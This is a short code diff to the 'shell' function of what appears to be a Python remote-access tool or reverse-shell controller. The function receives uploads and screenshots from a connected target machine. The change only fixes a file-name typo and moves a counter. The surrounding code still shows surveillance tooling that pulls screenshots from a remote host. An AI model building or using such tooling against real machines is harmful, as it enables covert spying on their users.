@@ -59,7 +59,7 @@ def shell(_s, _target, _addr):
                 failed = 'Failed to Upload'
                 reliable_send(_target, base64.b64encode(failed))
         elif cmd[:10] == 'screenshot':
-            temp_name = 'screenshoot_' + str(_addr[0]) + '_' + str(count) + '.png'
+            temp_name = 'screenshot_' + str(_addr[0]) + '_' + str(count) + '.png'
             with open(temp_name, 'wb') as sc:
                 png_data = reliable_recv(_target)
                 png_data_decode = base64.b64decode(png_data)
@@ -67,8 +67,8 @@ def shell(_s, _target, _addr):
                     print(png_data_decode)
                 else:
                     sc.write(png_data_decode)
+                    count += 1
                 sc.close()
-            count += 1
         else:
             result = reliable_recv(_target)
             print('------------------\n', result, '------------------\n')
